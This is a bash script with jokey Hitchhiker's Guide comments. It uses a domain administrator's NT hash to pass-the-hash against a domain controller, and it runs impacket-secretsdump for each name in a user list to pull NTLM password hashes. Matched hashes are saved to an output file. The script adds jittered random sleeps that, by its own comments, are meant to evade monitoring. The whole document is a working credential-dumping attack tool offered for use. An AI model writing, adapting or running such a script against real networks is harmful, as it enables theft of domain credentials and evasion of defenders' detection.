#!/bin/bash

# An Earthman's note: You'd think this would be more complicated, but nope!
# Just a few variable declarations. Think of them as your Guide's bookmarks.
DAUserName='administrator'
DA_NTHash='11111111111111111111111111111111'
DC_IP='192.168.145.200'
DomainName='WidgetCo.local'
outfileName='DC_dump_out.txt'
usersList='users.txt'
sleepTimeSeconds=10
sleepJitter=50

# Before we dive into the void, a small reminder: always bring a towel! 
echo "Starting the intergalactic password dump! ðŸš€"

# Loop through every username, like flipping through pages of The Guide.
while read -r username; do
    echo "Probing the universe for username: $username..."

    # Call our trusty old impacket-secretsdump, but remember to fill in those variables!
    secretsOut=$(impacket-secretsdump "$DomainName/$DAUserName@$DC_IP" -hashes ":$DA_NTHash" -just-dc-user "$username" -just-dc-ntlm -dc-ip "$DC_IP")

    # Now, this bit's like spotting a Vogon ship - always handle with care!
    if echo "$secretsOut" | grep -i -q "ERROR_DS_NAME_ERROR_NOT_FOUND:"; then
        echo "ERROR: $username NOT FOUND. Probably hiding somewhere in the galaxy."
    elif echo "$secretsOut" | grep -i -q "Error"; then
        echo "ERROR: Oh dear! Something's amiss. Don't forget to check the Improbability Drive!"
        echo "Raw Vogon poetry (output):"
        echo "$secretsOut"
        # Abort mission! There's a Vogon near!
        break
    else
        # Fish out the necessary data, just like how Ford Prefect fished Arthur Dent out of Earth!
        hashData=$(echo "$secretsOut" | grep -iE "$username:[0-9]+:[a-zA-Z0-9]{32}:[a-zA-Z0-9]{32}:::")
        if [ -n "$hashData" ]; then
            echo "Success! Found the answer to life, the universe, and $username's hash:"
            echo "$hashData"
            echo "$hashData" >> "$outfileName"
        else
            echo "Hmm, no fish (hash) found for $username. On to the next pond!"
        fi
    fi

    # Random sleep to throw off the Vogons, or any other monitoring aliens.
    sleepVariance=$(( ( RANDOM % ( 2 * sleepJitter + 1 ) ) - sleepJitter ))
    adjustedSleepTime=$(( sleepTimeSeconds + ( sleepVariance * sleepTimeSeconds / 100 ) ))
    echo "Resting for $adjustedSleepTime seconds. Good time for a cup of tea â˜•"
    sleep "$adjustedSleepTime"

done < "$usersList"

# At the end of the journey, just remember:
echo "Thanks for hitchhiking across the galaxy with me! Remember, DON'T PANIC. ðŸ‘"
